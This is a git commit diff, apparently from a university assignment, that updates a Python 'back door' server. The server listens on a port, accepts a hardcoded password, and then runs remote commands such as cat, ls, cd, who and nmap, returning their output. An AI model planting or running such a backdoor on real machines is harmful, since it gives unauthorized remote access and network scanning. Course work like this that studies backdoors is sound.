53f15fd2855eae09fe2ec49deeee888f15538589
ctsteele <ctsteele@ucalgary.ca>
2017-01-29 22:53:44 -0700

    Final Version

--- A1/bServer.py
+++ A1/bServer.py
@@ -1,36 +1,73 @@
-#https://docs.python.org/2/howto/sockets.html
-
 import socket
 import sys
 import subprocess
+import os
 
-#all proper commands
-correctCmd = ["pwd", "cd", "ls", "cat", "help", "off"]
+#array of all commands
+correctCmd = ["pwd", "cd", "ls", "cat", "help", "off", "nmap", "who"]
+#holds the original directory to default back to
+directory = os.getcwd()
+#string of all commands
+helpString = "  exit\t-closes the current connection\n  pwd\t-returns current working directory\n  cd\t-changes current working directory\n  ls\t-list files in current directory\n  cat\t-return contents of file\n  off\t-stop the back door\n  nmap\t-run nmap with parameters\n  who\t-list all logged in users"
 
-#runs a command
+#runs the user specified command
 def runCmd(cmd):
-	if (cmd.split())[0] in correctCmd:									#ensures command is allowed
-		if cmd == "help":																	#special case for 'help'
-			result = "possible commands:\n"
-			for i in correctCmd:
-				result = result + "\t" + i
-			result = result + "\n"
-		elif cmd == "off":																#special case for 'off'
-			quit()
-		else:																							#else attempts to run command
+	cmdType = cmd.split()[0]
+	cmd = cmd.split()
+	if cmdType in correctCmd:									#ensure command is in list
+	
+		if cmdType == "pwd":										#returns current working directory
+			result = os.getcwd()
+			
+		elif cmdType == "cd":										#changes directory
 			try:
-				result = subprocess.check_output(["/bin/" + cmd])
+				os.chdir(cmd[1])
+				result = "OK"
+			except FileNotFoundError:
+				result = "No such file or directory: '" + cmd[1] + "'"
+			except IndexError:
+				result = "please provide a directory to change to"
+				
+		elif cmdType == "ls":											#returns files in current folder
+			try:
+				result = subprocess.check_output(cmd)
 				result = result.decode('utf-8')
 			except subprocess.CalledProcessError:
-				result = "command '" + cmd + " could not be run successfully"
+				result = "please ensure all parameters are proper parameters that function with ls"
+				
+		elif cmdType == "cat":										#returns file specified by parameter
+			try:
+				with open(os.getcwd() + "/" + cmd[1], 'r') as f:
+					result = f.read()
+			except FileNotFoundError:
+				result = "no such file exists in the current directory"
+				
+		elif cmdType == "help":											#returns a list of valid commands
+			result = helpString
+				
+		elif cmdType == "off":											#shuts down the back door
+			result = "shutting down...\n"
 			
-	else:
-		result = "command not in list of valid commands\n"
-		
-	return result
+		elif cmdType == "nmap":											#runs nmap with specified parameters	
+			try:
+				result = subprocess.check_output(cmd)
+				result = result.decode('utf-8')
+			except subprocess.CalledProcessError:
+				result = "nmap requires correct params to function"
+				
+		elif cmdType == "who":											#returns all logged in users
+			result = subprocess.check_output('w')
+			result = result.decode('utf-8')
+			
+		else:																				#catch all just in case
+			result = "you are garbage"
+			
+	else:																					#if not valid command, reject
+		result = "command not in list of valid commands"
+	return result.rstrip()
 
 
-
+#main function to run the program
 def main():
 	try:
 		port = int(sys.argv[1])
@@ -41,30 +78,38 @@ def main():
 	sSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
 	sSocket.bind((socket.gethostname(), port))
 	sSocket.listen(0)
-	print("Listening at " + socket.gethostname() + " on port " + str(port) + "...")
+	print("Listening at " + socket.gethostbyname(socket.gethostname()) + " on port " + str(port) + "...")
 
 	#loop to continue to accept connections
 	while 1:
 		(cSocket, addr) = sSocket.accept()
 		print("connection received from " + str(addr))
 		print("sending challenge...")
-		cSocket.send("password?\n")
-		cmd = (cSocket.recv(32)).rstrip();
-		if cmd != "password":
-			cSocket.send("Denied. Closing coneection...")
+		cSocket.send(b"password?\n")
+		cmd = (str(cSocket.recv(64), 'utf-8')).rstrip()
+		if cmd == "password":
+			cSocket.send(bytes("correct password received\n" + os.getcwd() + "> ", 'utf-8'))
+		else:
+			cSocket.send(b"Denied. Closing connection...")
 			cSocket.close()
-			quit()
+			cmd = "exit"
 		
-		cSocket.send("correct password received\nPlease enter a command\n")
-		
+		#loop to accept commands from user
 		while cmd != "exit":
-			cmd = (cSocket.recv(32)).rstrip();
+			cmd = (str(cSocket.recv(64), 'utf-8')).rstrip()
 			print("received command '" + cmd + "'")
-			res = runCmd(cmd)
-			cSocket.send(res)
-			
+			if cmd == "off":
+				res = runCmd(cmd)
+				cSocket.send(bytes(res + "\n", 'utf-8'))
+				cSocket.close()
+				sSocket.close()
+				quit()
+			elif cmd != "" and cmd != "exit":
+				res = runCmd(cmd)
+				cSocket.send(bytes(res + "\n" + os.getcwd() + "> ", 'utf-8'))
 		cSocket.close()
 		print("connection to " + str(addr) + " was closed")
+		os.chdir(directory)
 		
 		
 main()
